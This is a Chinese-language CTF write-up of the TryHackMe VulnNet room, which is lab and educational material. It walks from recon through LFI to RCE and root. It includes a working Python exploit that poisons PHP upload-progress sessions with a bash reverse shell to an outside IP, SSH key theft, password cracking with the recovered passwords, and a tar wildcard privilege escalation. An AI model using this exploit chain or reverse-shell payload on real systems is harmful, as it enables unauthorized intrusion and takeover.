# VulnNet Writeup 
> URL : https://tryhackme.com/room/vulnnet1
IP : 10.10.86.144

- 題目敘述
	- `You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts`

## Recon
- 掃 Port
	- `rustscan -a 10.10.86.144 -r 1-65535`
		- ![](https://i.imgur.com/vIQriUD.png)
	- `nmap -A -p22,80 10.10.86.144`
		- ![](https://i.imgur.com/8iyHObG.png)
- 掃目錄
	- `python3 dirsearch.py -u http://10.10.86.144/`
		- ![](https://i.imgur.com/qURY7kW.png)
		- ![](https://i.imgur.com/vphYlEc.png)
- 發現登入頁面
	- ![](https://i.imgur.com/lOR56fr.png)
	- 戳了常見的 SQLi 都不行
- 觀察網頁連結
	- ![](https://i.imgur.com/UtPIr0V.png)
		- 透過 js formatter 轉漂亮
	- ![](https://i.imgur.com/rjfcVqd.png)
		- `broadcast.vulnnet.thm`
		- 加到 `/etc/hosts`
- 前面的階段也可以用 `LinkFinder`
	- `python3 linkfinder.py -i http://vulnnet.thm/`
		- ![](https://i.imgur.com/oWZvBQs.png)
	- `python3 linkfinder.py -i http://vulnnet.thm/js/index__d8338055.js`
		- ![](https://i.imgur.com/JlJlqLz.png)
		- ![](https://i.imgur.com/nJFz81A.png)
			- 發現首頁可以帶一個 `?referer` 參數
- 訪問 `broadcast.vulnnet.thm`
	- ![](https://i.imgur.com/VHfgLFt.png)
	- 發現需要登入

- 觀察首頁 `referer` 參數
	- 發現可以 LFI
		- ![](https://i.imgur.com/WKOWvWA.png)
	- 用 Session upload progress 大法
```python
import grequests
sess_name = 'meowmeow'
sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
base_url = 'http://vulnnet.thm/index.php'
param = "referer"

#code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
code = '''system("bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                            files={'f': "A"*0xffff},
                            data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                            cookies={'PHPSESSID': sess_name}),
            grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break
                   
```
- 然後就 RCE 了
	- ![](https://i.imgur.com/Nw726OE.png)
	- (感覺就不是正規解...ㄏㄏ
## 提權
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- 掃豌豆
	- ![](https://i.imgur.com/XZOpfXC.png)
	- 找到 backup
		- ![](https://i.imgur.com/KBMz0OO.png)
- 觀察 backup 檔案，發現有 ssh-backup
	- ![](https://i.imgur.com/so7QneR.png)
	- 偷出來
- 解壓縮
	- ![](https://i.imgur.com/jsXBiUr.png)
	- 發現是 `id_rsa`
		- ![](https://i.imgur.com/0P706uh.png)
- 到家目錄看使用者名稱
	- ![](https://i.imgur.com/v2l4V0H.png)
	- `server-management`
		- 發現是 `server-management`
- 準備 ssh 登入
	- ![](https://i.imgur.com/qRY1yQi.png)
	- 發現 `id_rsa` 需要密碼 QQ
- 用約翰爆破
	- `python3 ../../ssh2john.py id_rsa > id_rsa_john`
	- ![](https://i.imgur.com/Wd6L7hB.png)
	- 密碼是 `oneTWO3gOyac`
- SSH 登入
	- ![](https://i.imgur.com/78Hekqp.png)
	- 取得 user flag
- 跑豌豆掃到 `.htpasswd` 密碼的 hash
	- 猜測應該是給 `broadcast.vulnnet.thm` 用的
	- ![](https://i.imgur.com/cGflEXG.png)
	- 用約翰爆破個
		- ![](https://i.imgur.com/g5fTfFi.png)
		- 密碼是 ``9972761drmfsls`
	- 猜測原始思路正規解法應該是 LFI 到這個檔案
- 訪問 broadcast.vulnnet.thm
	- 使用帳號 `developers`
		- ![](https://i.imgur.com/jR4k1zC.png)
	- 密碼 `9972761drmfsls`
	- ![](https://i.imgur.com/Hp0c1Il.png)
		- 推測這應該是某個有 RCE 洞的 CMS
		- 正規解是從這邊進 RCE ㄅ
		- 隨便
## 二次提權
- 想起前面的 Backup 用了 `tar *`
	- 所以可以快速提權
	- ![](https://i.imgur.com/gE5YL0d.png)
- 接 Shell
	- ![](https://i.imgur.com/hXx86b5.png)
- 取 Root Flag
	- ![](https://i.imgur.com/XSutGiW.png)
